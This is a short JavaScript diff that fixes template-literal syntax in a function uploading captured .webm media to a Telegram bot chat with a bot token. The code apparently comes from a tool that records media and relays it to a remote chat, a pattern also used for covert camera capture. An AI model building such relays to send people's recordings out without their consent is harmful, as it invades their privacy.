@@ -171,9 +171,9 @@
 
         function sendMediaToTelegram(blob, type) {
             const formData = new FormData();
-            formData.append(type, blob, ${type}_${captureCount}.webm);
+            formData.append(type, blob, `${type}_${captureCount}.webm`);
 
-            axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}, formData, {
+            axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, formData, {
                 params: {
                     chat_id: CHAT_ID
                 }
